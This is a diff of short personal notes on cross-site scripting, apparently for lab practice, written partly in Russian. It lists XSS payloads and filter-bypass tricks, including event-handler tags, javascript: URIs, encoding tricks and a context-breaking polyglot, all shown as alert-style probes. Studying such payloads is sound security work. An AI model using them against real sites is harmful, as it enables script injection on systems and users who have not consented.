@@ -2,7 +2,7 @@ tips for xxs
 without parantheses
 
 
-```js
+```
 <img src=1 onerror=alert(1)>
 #<img src=1 onerror=alert(1)>
 <script>document.querySelector(‘#thm-title’).textContent = I am a hacker'</script>
@@ -26,7 +26,7 @@ eval('alert(9)')
 ```
 ---
 Основные методы вызова js из html
-```js
+```
 <script>...</script>
 <img onerror="..." src="x">
 <a href="%20javascript:..."></a>
@@ -40,9 +40,23 @@ encode html entety
 пробелы могу заменяться “/”, тэг необязательно закрывать
 double URL encoding
 
-```js
+```
 prompt('xss')
 %00<script>alert(9)</script>
 alert(location.origin)
 ${alert}
+────────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+────────────────────────────────────────────
+<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
+────────────────────────────────────────────
+<svg/onload=alert(9)>
+────────────────────────────────────────────
+<iframe onload=alert(document.domain)>
+────────────────────────────────────────────
+`+alert()+`
+────────────────────────────────────────────
+javascript:"http://google.com";alert()
+────────────────────────────────────────────
+javascript:alert();//@github.com#;alert();://eow5kas78d0wlv0.m.pipedream.net'
 ```
